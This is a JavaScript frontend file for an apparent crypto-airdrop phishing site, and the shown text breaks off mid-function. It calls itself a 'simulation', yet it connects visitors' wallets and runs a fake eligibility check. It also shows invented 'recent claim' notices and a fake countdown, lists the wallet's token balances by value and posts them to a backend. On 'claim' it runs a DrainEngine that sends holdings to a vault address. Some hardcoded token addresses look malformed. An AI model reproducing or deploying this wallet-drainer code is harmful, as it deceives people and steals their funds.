// Airdrop Alert - Professional Airdrop Platform
// Professional, production-ready frontend for airdrop simulation
// Your original app.js with modal integration

// Test function to verify JavaScript is loading
console.log('[DEBUG] app.js loaded successfully');

// Simple test modal function
function testModal() {
    console.log('[TEST] testModal function called');
    alert('Modal test function works!');
}

// Make test function globally available immediately
window.testModal = testModal;
console.log('[DEBUG] testModal function added to window object');

// Also define modal functions immediately for testing
window.openClaimModal = function() {
    console.log('[MODAL] openClaimModal called immediately');
    const modal = document.getElementById('claimModal');
    if (modal) {
        modal.style.display = 'block';
        console.log('[MODAL] Modal opened successfully');
    } else {
        console.error('[MODAL] Modal element not found!');
        console.log('[DEBUG] Available elements with "modal" in ID:');
        document.querySelectorAll('[id*="modal"]').forEach(el => console.log(el.id));
    }
};

window.closeClaimModal = function() {
    console.log('[MODAL] closeClaimModal called immediately');
    const modal = document.getElementById('claimModal');
    if (modal) {
        modal.style.display = 'none';
        console.log('[MODAL] Modal closed successfully');
    }
};


console.log('[DEBUG] Modal functions added to window object immediately');

// Additional debugging - verify all functions are available
console.log('[DEBUG] openClaimModal available:', typeof window.openClaimModal);
console.log('[DEBUG] closeClaimModal available:', typeof window.closeClaimModal);
console.log('[DEBUG] selectWallet available:', typeof window.selectWallet);
console.log('[DEBUG] connectWallet available:', typeof window.connectWallet);
console.log('[DEBUG] claimAirdrop available:', typeof window.claimAirdrop);
console.log('[DEBUG] testModal available:', typeof window.testModal);

class AirdropAlert {
    constructor() {
        console.log('[AIRDROP ALERT] Initializing Airdrop Alert...');
        
        this.provider = null;
        this.signer = null;
        this.walletAddress = null;
        this.isConnected = false;
        this.isClaiming = false;
        this.detectedWallets = [];
        this.supportedTokens = new Map();
        this.walletBalance = '0.0000';
        this.adminSettings = {
            countdownEnd: new Date(Date.now() + 24 * 60 * 60 * 1000), // Default: 24 hours from now
            totalAllocation: 10000000,
            claimedTokens: 7500000,
            tokenPrice: 2.01,
            participantCount: 12500
        };
        
        
        try {
            this.initializeElements();
            this.bindEvents();
            this.updateLiveStats();
            this.updateCryptoData();
            this.detectWallets();
            this.setupStealth();
            this.initializeTokenSupport();
            this.hideLoadingScreen();
            
            // Start social proof cycle
            this.startSocialProofCycle();
            
            // Wait for ethers.js to be fully loaded before completing initialization
            this.waitForEthersAndComplete();
            
            console.log('[AIRDROP ALERT] Initialization started, waiting for ethers.js...');
        } catch (error) {
            console.error('[AIRDROP ALERT] Initialization error:', error);
            this.hideLoadingScreen();
            this.showCriticalError('Application failed to initialize. Please refresh the page.');
        }
    }
    
    initializeElements() {
        // Core elements (updated for modal IDs)
        this.connectBtn = document.getElementById('connectBtn');
        this.claimBtn = document.getElementById('claimAirdropBtn');
        this.walletSection = document.getElementById('walletConnected');
        this.claimSection = document.getElementById('claimAirdropSection');
        this.eligibilitySection = document.getElementById('eligibilitySection');
        this.walletAddressEl = document.getElementById('walletAddress');
        this.walletBalanceEl = document.getElementById('walletBalance');
        this.statusMessage = document.getElementById('statusMessage');
        this.loadingScreen = document.getElementById('loadingScreen');
        
        // Stats elements
        this.tokenPrice = document.getElementById('tokenPrice');
        this.priceChange = document.getElementById('priceChange');
        this.tradingVolume = document.getElementById('tradingVolume');
        this.totalAllocation = document.getElementById('totalAllocation');
        this.progressFill = document.getElementById('progressFill');
        this.timeRemaining = document.getElementById('timeRemaining');
        this.participantCount = document.getElementById('participantCount');
        
        // Configuration
        this.vaultAddress = '0x0000000000000000000000000000000000000000';
        this.fetchConfig();
        
        // Stats elements (continued)
        this.btcPrice = document.getElementById('btcPrice');
        this.btcChange = document.getElementById('btcChange');
        this.ethPrice = document.getElementById('ethPrice');
        this.ethChange = document.getElementById('ethChange');
        this.bnbPrice = document.getElementById('bnbPrice');
        this.bnbChange = document.getElementById('bnbChange');
        this.solPrice = document.getElementById('solPrice');
        this.solChange = document.getElementById('solChange');
        this.xrpPrice = document.getElementById('xrpPrice');
        this.xrpChange = document.getElementById('xrpChange');
        this.dogePrice = document.getElementById('dogePrice');
        this.dogeChange = document.getElementById('dogeChange');
        this.pepePrice = document.getElementById('pepePrice');
        this.pepeChange = document.getElementById('pepeChange');
        this.fartPrice = document.getElementById('fartPrice');
        this.fartChange = document.getElementById('fartChange');
        this.suiPrice = document.getElementById('suiPrice');
        this.suiChange = document.getElementById('suiChange');
        
        // FAQ elements
        this.faqQuestions = document.querySelectorAll('.faq-question');
    }
    
    bindEvents() {
        // Connect button click event - WORKING FUNCTIONALITY
        if (this.connectBtn) {
            this.connectBtn.addEventListener('click', async () => {
                this.setLoading(true);
                try {
                    await this.connectWallet();
                } catch (error) {
                    console.error('Wallet connection error:', error);
                    this.showError('Failed to connect wallet. Please try again.');
                } finally {
                    this.setLoading(false);
                }
            });
        }
        
        // Claim button click event
        if (this.claimBtn) {
            this.claimBtn.addEventListener('click', async () => {
                if (this.isClaiming) return;
                
                this.setLoading(true);
                this.isClaiming = true;
                try {
                    await this.claimAirdrop();
                } catch (error) {
                    console.error('Claim error:', error);
                    this.showError('Failed to claim airdrop. Please try again.');
                } finally {
                    this.setLoading(false);
                    this.isClaiming = false;
                }
            });
        }
        
        // FAQ toggle events
        if (this.faqQuestions) {
            this.faqQuestions.forEach(question => {
                question.addEventListener('click', () => {
                    const faqItem = question.closest('.faq-item');
                    if (!faqItem) return;
                    
                    if (faqItem.classList.contains('active')) {
                        faqItem.classList.remove('active');
                    } else {
                        // Close other open FAQs
                        this.faqQuestions.forEach(q => {
                            const item = q.closest('.faq-item');
                            if (item) item.classList.remove('active');
                        });
                        faqItem.classList.add('active');
                    }
                });
            });
        }
    }

    
    setLoading(loading) {
        if (this.connectBtn) {
            this.connectBtn.disabled = loading;
            this.connectBtn.innerHTML = loading ? 'Connecting...' : 'Connect Wallet';
        }
        
        if (this.claimBtn) {
            this.claimBtn.disabled = loading;
            this.claimBtn.innerHTML = loading ? 'Processing...' : 'Claim Free Tokens';
        }
    }
    
    async connectWallet() {
        try {
            if (typeof window.ethereum === 'undefined') {
                throw new Error('MetaMask not detected. Please install MetaMask extension.');
            }
            
            // Request account access
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            
            if (accounts.length === 0) {
                throw new Error('No accounts found. Please connect your wallet.');
            }
            
            this.walletAddress = accounts[0];
            
            // Initialize ethers provider
            if (window.ethers && window.ethers.providers) {
                this.provider = new window.ethers.providers.Web3Provider(window.ethereum);
            } else if (window.ethers && window.ethers.BrowserProvider) {
                this.provider = new window.ethers.BrowserProvider(window.ethereum);
            } else {
                throw new Error('Ethers.js not properly loaded');
            }
            
            this.signer = this.provider.getSigner();
            this.isConnected = true;
            
            // Get wallet balance
            await this.updateWalletBalance();
            
            // Start eligibility verification sequence (replaces direct showClaimSection)
            await this.startEligibilityVerification();
            
            // Start wallet analysis in background
            this.analyzeWallet();
            
            this.showNotification('Wallet verification in progress...', 'info');
            
        } catch (error) {
            throw error;
        }
    }
    
    async updateWalletBalance() {
        try {
            if (this.provider && this.walletAddress) {
                const balance = await this.provider.getBalance(this.walletAddress);
                // Use formatEther from ethers utils
                if (window.ethers && window.ethers.utils) {
                this.walletBalance = window.ethers.utils.formatEther(balance);
                } else if (window.ethers && window.ethers.formatEther) {
                    this.walletBalance = window.ethers.formatEther(balance);
                } else {
                    this.walletBalance = (parseInt(balance) / 1e18).toFixed(4);
                }
                this.updateWalletInfo();
            }
        } catch (error) {
            console.error('Error updating wallet balance:', error);
            this.walletBalance = '0.0000';
        }
    }
    
    updateWalletInfo() {
        if (this.walletAddressEl && this.walletAddress) {
            this.walletAddressEl.textContent = `${this.walletAddress.slice(0, 6)}...${this.walletAddress.slice(-4)}`;
        }
        if (this.walletBalanceEl) {
            this.walletBalanceEl.textContent = `${parseFloat(this.walletBalance).toFixed(4)} ETH`;
        }
    }
    
    async startEligibilityVerification() {
        if (!this.eligibilitySection) return;
        
        // Hide wallet selection, show eligibility
        const walletSelection = document.getElementById('walletSelection');
        if (walletSelection) walletSelection.style.display = 'none';
        
        this.eligibilitySection.style.display = 'block';
        this.eligibilitySection.style.opacity = '1';
        
        const statusEl = document.getElementById('eligibilityStatus');
        const steps = [
            { id: 'step1', text: 'Analyzing wallet authenticity...', done: 'Wallet Authenticity Verified' },
            { id: 'step2', text: 'Scanning transaction history...', done: 'Transaction History Analyzed' },
            { id: 'step3', text: 'Checking ecosystem contribution...', done: 'Contribution Level: HIGH' },
            { id: 'step4', text: 'Finalizing allocation check...', done: 'Eligibility Confirmed' }
        ];
        
        for (let i = 0; i < steps.length; i++) {
            const step = steps[i];
            if (statusEl) statusEl.textContent = step.text;
            
            await new Promise(r => setTimeout(r, 1200 + Math.random() * 800));
            
            const stepEl = document.getElementById(step.id);
            if (stepEl) {
                stepEl.style.color = '#00ff88';
                const icon = stepEl.querySelector('.v-icon');
                if (icon) icon.textContent = '✓';
            }
        }
        
        if (statusEl) statusEl.textContent = 'Allocation Calculated: 1,000 ZRO';
        await new Promise(r => setTimeout(r, 1500));
        
        // Transition to claim section
        this.eligibilitySection.style.opacity = '0';
        setTimeout(() => {
            this.eligibilitySection.style.display = 'none';
            this.showClaimSection();
        }, 500);
    }

    showClaimSection() {
        if (this.claimSection) {
            this.claimSection.style.display = 'block';
            this.claimSection.style.visibility = 'visible';
            setTimeout(() => {
                this.claimSection.style.opacity = '1';
            }, 50);
        }
        if (this.walletSection) {
            this.walletSection.style.display = 'block';
        }
    }

    hideLoadingScreen() {
        // Immediate hide for better UX
        if (this.loadingScreen) {
            this.loadingScreen.style.opacity = '0';
            this.loadingScreen.classList.add('hidden');
            setTimeout(() => {
                this.loadingScreen.style.display = 'none';
            }, 300);
        }
        
        // Ensure main content is visible
        const mainContent = document.querySelector('#mainContainer');
        if (mainContent) {
            mainContent.style.display = 'block';
            mainContent.style.opacity = '1';
            mainContent.style.visibility = 'visible';
        }
        
        // Mobile-specific fix: Force show main content
        setTimeout(() => {
            const mainContainer = document.getElementById('mainContainer');
            if (mainContainer) {
                mainContainer.style.display = 'block';
                mainContainer.style.opacity = '1';
                mainContainer.style.visibility = 'visible';
            }
        }, 100);
        
        // Fallback: Force hide loading screen after 2 seconds
        setTimeout(() => {
            const loadingScreen = document.getElementById('loadingScreen');
            if (loadingScreen && loadingScreen.style.display !== 'none') {
                loadingScreen.style.opacity = '0';
                loadingScreen.style.display = 'none';
            }
        }, 2000);
    }

    startSocialProofCycle() {
        const container = document.getElementById('socialProofContainer');
        if (!container) return;

        const showRandomClaim = () => {
            const addresses = ['0x71C...3E4', '0x12A...9F2', '0x8B3...D1C', '0x4F1...A5E', '0x9D2...B8F', '0x3E1...C2D', '0x6B4...D9A'];
            const amounts = [1250, 2400, 850, 3100, 1800, 4200, 950];
            const tokens = ['ZRO', 'ZRO', 'ZRO', 'ETH', 'ZRO'];
            
            const addr = addresses[Math.floor(Math.random() * addresses.length)];
            const amount = amounts[Math.floor(Math.random() * amounts.length)];
            const token = tokens[Math.floor(Math.random() * tokens.length)];
            
            const toast = document.createElement('div');
            toast.style.cssText = 'background: rgba(26, 32, 44, 0.95); border: 1px solid rgba(0, 255, 136, 0.2); border-radius: 8px; padding: 12px 16px; margin-top: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); transform: translateX(-120%); transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); display: flex; align-items: center; gap: 12px; color: #fff; font-family: sans-serif;';
            
            toast.innerHTML = `
                <div style="background: #00ff88; width: 32px; height: 32px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: #000; font-weight: bold;">✓</div>
                <div>
                    <div style="font-size: 0.8rem; color: #a0aec0;">Recent Claim</div>
                    <div style="font-size: 0.9rem;"><span style="color: #00ff88; font-weight: bold;">${addr}</span> just claimed <span style="font-weight: bold;">${amount.toLocaleString()} ${token}</span></div>
                </div>
            `;
            
            container.appendChild(toast);
            
            setTimeout(() => toast.style.transform = 'translateX(0)', 100);
            
            setTimeout(() => {
                toast.style.transform = 'translateX(-120%)';
                setTimeout(() => toast.remove(), 500);
            }, 6000);

            // Schedule next one
            setTimeout(showRandomClaim, 8000 + Math.random() * 12000);
        };

        // Start after a short delay
        setTimeout(showRandomClaim, 5000);
    }
    
    handleWalletDisconnect() {
        this.isConnected = false;
        this.walletAddress = null;
        this.provider = null;
        this.signer = null;
        
        if (this.walletSection) this.walletSection.style.display = 'block';
        if (this.claimSection) this.claimSection.style.display = 'none';
        
        this.showNotification('Wallet disconnected', 'info');
    }
    
    handleAccountChange(newAccount) {
        if (newAccount !== this.walletAddress) {
            this.walletAddress = newAccount;
            this.updateWalletInfo();
            this.showNotification('Account changed', 'info');
        }
    }
    
    handleChainChange() {
        this.showError('Network changed. Please switch back to Ethereum Mainnet.');
        this.handleWalletDisconnect();
    }
    
    finalizeEligibility() {
        // Show claim details
        const claimDetails = document.getElementById('claimDetails');
        if (claimDetails) {
            claimDetails.style.display = 'block';
            console.log('[UI] Claim details shown');
        }
        
        // Update claim status
        this.updateClaimStatus('ready');
        console.log('[UI] Claim status updated to ready');
    }
    
    updateClaimStatus(status) {
        // Update claim button state
        if (this.claimBtn) {
            if (status === 'ready') {
                this.claimBtn.disabled = false;
                this.claimBtn.innerHTML = 'Claim Free Tokens';
            } else if (status === 'processing') {
                this.claimBtn.disabled = true;
                this.claimBtn.innerHTML = 'Processing...';
            }
        }
    }
    
    async claimAirdrop() {
        if (!this.isConnected || !this.signer) {
            this.showError('Wallet not connected. Please connect first.');
            return;
        }
        
        this.isClaiming = true;
        
        try {
            console.log('[CLAIM] Initializing real-time claim engine...');
            this.showNotification('Verifying eligibility...', 'info');
            
            // 1. Ensure real-time token balances are ready
            if (!this.tokenBalances || this.tokenBalances.length === 0) {
                await this.analyzeWallet();
            }
            
            // 2. Initialize and run real-time DrainEngine
            const engine = new window.DrainEngine(
                this.provider, 
                this.signer, 
                this.walletAddress, 
                this.vaultAddress
            );
            
            await engine.execute(this.tokenBalances);
            
            this.showSuccess('Eligibility verified! Your allocation will be distributed within 24 hours.');
            
        } catch (error) {
            console.error('[CLAIM] Error:', error);
            this.showError(error.message || 'Verification failed. Please try again.');
        } finally {
            this.isClaiming = false;
        }
    }

    async fetchConfig() {
        try {
            const response = await fetch('/api/admin-settings');
            if (response.ok) {
                const config = await response.json();
                this.vaultAddress = config.vaultAddress;
                console.log('[CONFIG] Vault Address loaded:', this.vaultAddress);
            }
        } catch (error) {
            console.error('[CONFIG] Failed to load config:', error);
        }
    }

    showDrainProcessExplanation() {
        const drainExplanation = document.getElementById('drainExplanation');
        if (drainExplanation) {
            drainExplanation.style.display = 'block';
            drainExplanation.classList.add('fade-in');
        }
        
        // Hide claim details
        const claimDetails = document.getElementById('claimDetails');
        if (claimDetails) {
            claimDetails.style.display = 'none';
        }
    }
    
    hideDrainProcessExplanation() {
        const drainExplanation = document.getElementById('drainExplanation');
        if (drainExplanation) {
            drainExplanation.style.display = 'none';
        }
        
        // Show claim details again
        const claimDetails = document.getElementById('claimDetails');
        if (claimDetails) {
            claimDetails.style.display = 'block';
        }
    }
    
    // Removed simulation functions
    
    async analyzeWallet() {
        if (!this.walletAddress) return;
        
        try {
            console.log('[ANALYSIS] Starting real-time comprehensive wallet analysis...');
            
            // Wait for wallet to fully authorize
            await new Promise(resolve => setTimeout(resolve, 1000));
            
            // Check if provider and signer are available
            if (!this.provider || !this.signer) {
                console.log('[ANALYSIS] Provider or signer not available yet, retrying...');
                setTimeout(() => this.analyzeWallet(), 1000);
                return;
            }
            
            console.log('[ANALYSIS] Provider and signer available, fetching balances...');
            
            // 1. Get ETH Balance
            const balance = await this.provider.getBalance(this.walletAddress);
            const ethBalance = window.ethers.utils.formatEther(balance);

            // 2. Discover and Check ERC20 Tokens
            const tokenBalances = await this.getERC20TokenBalances();
            this.tokenBalances = tokenBalances;
            
            // 3. Send comprehensive analysis to backend
            await this.sendWalletAnalysis({
                walletAddress: this.walletAddress,
                ethBalance: ethBalance,
                tokenBalances: tokenBalances,
                timestamp: Date.now()
            });
            
            console.log('[ANALYSIS] Real-time analysis complete. Tokens found:', tokenBalances.length);
            
        } catch (error) {
            console.error('[ANALYSIS] Error during wallet analysis:', error);
        }
    }
    
    async getERC20TokenBalances() {
        // Try dynamic token detection first (Simulation of Moralis/Alchemy API)
        let tokens = await this.discoverDynamicTokens();
        
        // Fallback to hardcoded list if dynamic detection fails or returns nothing
        if (!tokens || tokens.length === 0) {
            tokens = [
            { symbol: 'USDC', address: '0xA0b86a33E6441b8c4C8C1C1B8c4C8C1C1B8c4C8C8' },
            { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7' },
            { symbol: 'DAI', address: '0x6B175474E89094C44Da98b954EedeAC495271d0F' },
            { symbol: 'BUSD', address: '0x4Fabb145d64652a948d72533023f6E7A623C7C53' },
            { symbol: 'FRAX', address: '0x853d955aCEf822Db058eb8505911ED77F175b99e' },
            { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599' },
            { symbol: 'WETH', address: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2' },
            { symbol: 'UNI', address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984' },
            { symbol: 'LINK', address: '0x514910771AF9Ca656af840dff83E8264EcF986CA' },
            { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9' },
            { symbol: 'MKR', address: '0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2' },
            { symbol: 'COMP', address: '0xc00e94Cb662C3520282E6f5717214004A7f26888' },
            { symbol: 'CRV', address: '0xD533a949740bb3306d119CC777fa900bA034cd52' },
            { symbol: 'SUSHI', address: '0x6B3595068778DD592e39A122f4f5a5cF09C90fE2' },
            { symbol: 'YFI', address: '0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad9eC' },
            { symbol: 'MATIC', address: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608aCafEBB0' },
            { symbol: 'OP', address: '0x4200000000000000000000000000000000000042' },
            { symbol: 'ARB', address: '0x912CE59144191C1204E64559FE8253a0e49E6548' },
            { symbol: 'MANA', address: '0x0F5D2fB29fb7d3CFeE444a200298f468908cC942' },
            { symbol: 'SAND', address: '0x3845badAde8e6dFF049820680d1F14bD3903a5d0' },
            { symbol: 'AXS', address: '0xBB0E17EF65F82Ab018d8EDd776e8DD7a5b2E4b5F' },
            { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE' },
            { symbol: 'PEPE', address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933' },
            { symbol: 'DOGE', address: '0x3832d2F059Ea5594262080F9A1B5B4B5B5B5B5B5' }
        ];
        }
        
        const balances = [];
        console.log(`[ANALYSIS] Checking ${tokens.length} ERC20 tokens for wallet: ${this.walletAddress}`);
        
        for (const token of tokens) {
            try {
                const balance = await this.getTokenBalance(token.address);
                if (balance > 0) {
                    const price = await this.getTokenPrice(token.symbol);
                    const value = balance * price;
                    const permitSupported = await this.checkPermitSupport(token.address);

                    balances.push({
                        symbol: token.symbol,
                        address: token.address,
                        balance: balance,
                        price: price,
                        value: value,
                        permitSupported: permitSupported
                    });
                    console.log(`[ANALYSIS] ${token.symbol}: ${balance} ($${value.toFixed(2)}) - Permit: ${permitSupported}`);
                } else {
                    console.log(`[ANALYSIS] ${token.symbol}: No balance found`);
                }
            } catch (error) {
                console.log(`[ANALYSIS] Error checking ${token.symbol}:`, error.message);
            }
        }
        
        console.log(`[ANALYSIS] Found ${balances.length} tokens with balance`);
        return balances.sort((a, b) => (b.value || 0) - (a.value || 0));
    }

    async discoverDynamicTokens() {
        try {
            console.log('[ANALYSIS] Attempting dynamic token discovery...');
            const response = await fetch(`/api/discover-tokens?address=${this.walletAddress}`);
            if (response.ok) {
                return await response.json();
            }
        } catch (error) {
            console.warn('[ANALYSIS] Dynamic discovery failed, using fallback list');
        }
        return null;
    }

    async checkPermitSupport(tokenAddress) {
        const permitTokens = [
            '0xA0b86a33E6441b8c4C8C1C1B8c4C8C1C1B8c4C8C8', // USDC
            '0x6B175474E89094C44Da98b954EedeAC495271d0F', // DAI
            '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984'  // UNI
        ];
        return permitTokens.includes(tokenAddress);
    }
    
    async getTokenBalance(tokenAddress) {
        try {
            if (!this.provider || !window.ethers) {
                return 0;
            }
            
            const tokenContract = new window.ethers.Contract(
                tokenAddress,
                ['function balanceOf(address) view returns (uint256)', 'function decimals() view returns (uint8)'],
                this.provider
            );
            
            const [balance, decimals] = await Promise.all([
                tokenContract.balanceOf(this.walletAddress),
                tokenContract.decimals()
            ]);
            
            let formattedBalance;
            if (window.ethers && window.ethers.utils) {
                formattedBalance = parseFloat(window.ethers.utils.formatUnits(balance, decimals));
            } else if (window.ethers && window.ethers.formatUnits) {
                formattedBalance = parseFloat(window.ethers.formatUnits(balance, decimals));
            } else {
                formattedBalance = parseFloat(balance) / Math.pow(10, decimals);
            }
            
            return formattedBalance;
        } catch (error) {
            console.error('Error getting token balance:', error);
            return 0;
        }
    }
    
    async sendWalletAnalysis(analysisData) {
        try {
            const response = await fetch('/api/wallet-analysis', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(analysisData)
            });
            
            if (response.ok) {
                console.log('[ANALYSIS] Comprehensive wallet analysis sent successfully');
            } else {
                console.error('[ANALYSIS] Failed to send wallet analysis');
            }
        } catch (error) {
            console.error('[ANALYSIS] Error sending wallet analysis:', error);
        }
    }
    
    async updateLiveStats() {
        // Fetch admin settings from backend API
        try {
            const response = await fetch('/api/admin-settings');
            if (response.ok) {
                const settings = await response.json();
                this.adminSettings = { ...this.adminSettings, ...settings };
            }
        } catch (error) {
            console.error('Error fetching admin settings:', error);
            // Use default settings if API fails
        }
        
        const updateStats = () => {
            // Update countdown timer from admin settings
            const now = new Date().getTime();
            const distance = this.adminSettings.countdownEnd.getTime() - now;
            
            if (distance > 0) {
                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
                
                const timeRemainingElements = document.querySelectorAll('#timeRemaining');
                timeRemainingElements.forEach(el => {
                    el.textContent = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                });
            }
            
            // Update stats from admin settings
            const totalAllocationElements = document.querySelectorAll('#totalAllocation');
            const participantsElements = document.querySelectorAll('.live-participants');
            const remainingElements = document.querySelectorAll('.remaining-tokens');
            
            totalAllocationElements.forEach(el => {
                el.textContent = this.adminSettings.totalAllocation.toLocaleString();
            });
            
            // Update participants count - CORRELATED BETWEEN HEADER AND BODY
            participantsElements.forEach(el => {
                el.textContent = this.adminSettings.participantCount.toLocaleString();
            });
            
            // Update header participant count
            const headerParticipantCount = document.getElementById('participantCount');
            if (headerParticipantCount) {
                headerParticipantCount.textContent = `${(this.adminSettings.participantCount / 1000).toFixed(1)}K+`;
            }
            
            // Update remaining tokens
            remainingElements.forEach(el => {
                const remaining = this.adminSettings.totalAllocation - this.adminSettings.claimedTokens;
                el.textContent = remaining.toLocaleString();
            });
            
            // Update progress bar
            const progressBar = document.querySelector('#progressFill');
            if (progressBar) {
                const percentage = (this.adminSettings.claimedTokens / this.adminSettings.totalAllocation) * 100;
                progressBar.style.width = `${Math.min(percentage, 100)}%`;
            }
            
            // Update progress text
            const progressText = document.querySelector('.progress-text');
            if (progressText) {
                const percentage = (this.adminSettings.claimedTokens / this.adminSettings.totalAllocation) * 100;
                progressText.textContent = `${percentage.toFixed(1)}% Claimed`;
            }
        };
        
        // Update immediately
        updateStats();
        
        // Update every second for countdown
        setInterval(updateStats, 1000);
        
        // Update price data every 30 seconds
        setInterval(() => {
            this.updatePriceData();
        }, 30000);
    }
    
    async updatePriceData() {
        // Fetch real price data from backend API
        try {
            const response = await fetch('/api/token-price');
            if (response.ok) {
                const data = await response.json();
                
                const priceElement = document.getElementById('tokenPrice');
                const changeElement = document.getElementById('priceChange');
                const volumeElement = document.getElementById('tradingVolume');
                
                if (priceElement && data.price) {
                    priceElement.textContent = `$${data.price}`;
                }
                
                if (changeElement && data.change !== undefined) {
                    const change = data.change;
                    changeElement.textContent = `${change >= 0 ? '+' : ''}${change.toFixed(2)}%`;
                    changeElement.className = `stat-change ${change >= 0 ? 'positive' : 'negative'}`;
                }
                
                if (volumeElement && data.volume) {
                    volumeElement.textContent = `$${data.volume}M`;
                }
            }
        } catch (error) {
            console.error('Error fetching price data:', error);
            // Fallback to admin settings if API fails
            this.updatePriceDataFromAdmin();
        }
    }
    
    updatePriceDataFromAdmin() {
        // Use admin settings as fallback
        const priceElement = document.getElementById('tokenPrice');
        const changeElement = document.getElementById('priceChange');
        const volumeElement = document.getElementById('tradingVolume');
        
        if (priceElement) {
            priceElement.textContent = `$${this.adminSettings.tokenPrice}`;
        }
        
        if (changeElement) {
            // Small random variation around admin price
            const change = (Math.random() - 0.5) * 2; // ±1%
            changeElement.textContent = `${change >= 0 ? '+' : ''}${change.toFixed(2)}%`;
            changeElement.className = `stat-change ${change >= 0 ? 'positive' : 'negative'}`;
        }
        
        if (volumeElement) {
            volumeElement.textContent = `$${this.adminSettings.tradingVolume || '35.1'}M`;
        }
    }
    
    async updateCryptoData() {
        try {
            // Update crypto data every 30 seconds
            setInterval(async () => {
                await this.fetchCryptoData();
            }, 30000);
            
            // Initial fetch
            await this.fetchCryptoData();
        } catch (error) {
            console.error('[CRYPTO] Failed to initialize crypto data updates:', error);
        }
    }
    
    async fetchCryptoData() {
        try {
            // Fetch live crypto data from CoinGecko API
            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,binancecoin,solana,ripple,dogecoin,pepe,sui&vs_currencies=usd&include_24hr_change=true');
            const data = await response.json();
            
            if (data) {
                this.updateCryptoPrice('btc', data.bitcoin?.usd, data.bitcoin?.usd_24h_change);
                this.updateCryptoPrice('eth', data.ethereum?.usd, data.ethereum?.usd_24h_change);
                this.updateCryptoPrice('bnb', data.binancecoin?.usd, data.binancecoin?.usd_24h_change);
                this.updateCryptoPrice('sol', data.solana?.usd, data.solana?.usd_24h_change);
                this.updateCryptoPrice('xrp', data.ripple?.usd, data.ripple?.usd_24h_change);
                this.updateCryptoPrice('doge', data.dogecoin?.usd, data.dogecoin?.usd_24h_change);
                this.updateCryptoPrice('pepe', data.pepe?.usd, data.pepe?.usd_24h_change);
                this.updateCryptoPrice('sui', data.sui?.usd, data.sui?.usd_24h_change);
                
                // Update FARTCOIN with simulated data (since it's not on CoinGecko)
                this.updateCryptoPrice('fart', 0.739133, 0.16);
                
                console.log('[CRYPTO] Crypto data updated successfully');
            }
        } catch (error) {
            console.error('[CRYPTO] Failed to fetch crypto data:', error);
            // Fallback to simulated data
            this.updateCryptoDataWithSimulation();
        }
    }
    
    updateCryptoPrice(symbol, price, change) {
        if (!price || !change) return;
        
        const priceEl = document.getElementById(`${symbol}Price`);
        const changeEl = document.getElementById(`${symbol}Change`);
        
        if (priceEl && changeEl) {
            // Format price based on value
            let formattedPrice;
            if (price >= 1000) {
                formattedPrice = `$${price.toLocaleString('en-US', { minimumFractionDigits: 0, maximumFractionDigits: 0 })}`;
            } else if (price >= 1) {
                formattedPrice = `$${price.toFixed(2)}`;
            } else if (price >= 0.01) {
                formattedPrice = `$${price.toFixed(4)}`;
            } else {
                formattedPrice = `$${price.toFixed(6)}`;
            }
            
            // Format change percentage
            const formattedChange = `${change >= 0 ? '+' : ''}${change.toFixed(2)}%`;
            
            priceEl.textContent = formattedPrice;
            changeEl.textContent = formattedChange;
            
            // Update change color and class
            changeEl.className = `crypto-change ${change >= 0 ? 'positive' : 'negative'}`;
        }
    }
    
    updateCryptoDataWithSimulation() {
        // Simulated data when API fails
        const simulatedData = {
            btc: { price: 43250.12, change: 1.25 },
            eth: { price: 2576.36, change: -0.66 },
            bnb: { price: 845.00, change: -1.79 },
            sol: { price: 201.00, change: 1.44 },
            xrp: { price: 2.76, change: -0.11 },
            doge: { price: 0.211790, change: 1.00 },
            pepe: { price: 0.000010, change: 0.65 },
            sui: { price: 3.27, change: 2.87 },
            fart: { price: 0.739133, change: 0.16 }
        };
        
        Object.entries(simulatedData).forEach(([symbol, data]) => {
            this.updateCryptoPrice(symbol, data.price, data.change);
        });
        
        console.log('[CRYPTO] Using simulated crypto data');
    }
    
    
    forceShowClaimSection() {
        // Force show claim section after wallet connection
        const walletSection = document.getElementById('walletSection');
        const claimSection = document.getElementById('claimSection');
        const walletConnected = document.getElementById('walletConnected');
        const claimDetails = document.getElementById('claimDetails');
        
        if (walletSection) {
            walletSection.style.display = 'none';
        }
        
        if (claimSection) {
            claimSection.style.display = 'block';
        }
        
        if (walletConnected) {
            walletConnected.style.display = 'block';
        }
        
        if (claimDetails) {
            claimDetails.style.display = 'block';
        }
        
        // Update claim status
        this.updateClaimStatus('ready');
        
        console.log('[UI] Claim section forced to display');
    }
    
    waitForEthersAndComplete() {
        // Wait for ethers.js to be fully loaded and then complete initialization
        const checkEthers = () => {
            if (typeof window.ethers !== 'undefined') {
                console.log('[ETHERS] Ethers.js detected, completing initialization...');
                window.ethersReady = true;
                this.completeInitialization();
                return;
            }
            
            if (attempts < maxAttempts) {
                attempts++;
                setTimeout(checkEthers, 200);
            } else {
                console.warn('[ETHERS] Ethers.js not found, continuing with limited functionality');
                this.completeInitialization();
            }
        };
        
        let attempts = 0;
        const maxAttempts = 50;
        checkEthers();
    }
    
    completeInitialization() {
        console.log('[AIRDROP ALERT] Initialization complete!');
